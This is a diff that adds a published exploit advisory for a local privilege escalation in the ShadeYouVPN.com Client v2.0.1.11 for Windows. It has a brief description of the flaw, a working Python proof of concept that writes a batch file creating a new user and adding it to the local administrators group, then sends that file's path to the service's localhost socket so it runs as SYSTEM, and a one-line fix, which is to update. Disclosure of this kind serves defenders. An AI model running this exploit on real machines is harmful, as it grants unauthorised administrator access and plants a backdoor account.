@@ -1,0 +1,39 @@
+# Exploit ShadeYouVPN.com Client v2.0.1.11 for Windows Privilege Escalation
+# Date: 14.02.2017
+# Software Link: https://shadeyouvpn.com/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: local
+  
+1. Description
+ 
+`ShadeYou` service executes any file path send through socket without verification as SYSTEM user.
+
+https://security.szurek.pl/shadeyouvpncom-client-v20111-for-windows-privilege-escalation.html
+
+2. Proof of Concept
+
+import socket
+import tempfile
+
+print "ShadeYouVPN.com Client v2.0.1.11 for Windows Privilege Escalation"
+print "by Kacper Szurek"
+print "https://security.szurek.pl/"
+print "https://twitter.com/KacperSzurek"
+
+t = tempfile.TemporaryFile(delete=False, suffix='.bat')
+t.write("net user shade /add\n")
+t.write("net localgroup administrators shade /add")
+t.close()
+
+s = socket.socket()
+s.connect(("127.0.0.1", 10295))
+
+s.send("s||config|"+t.name+"|ccccc|ddddd|eeee|ffff|\r\n")
+print s.recv(1024)
+print s.recv(1024)
+
+3. Solution
+ 
+Update to version 2.0.1.12
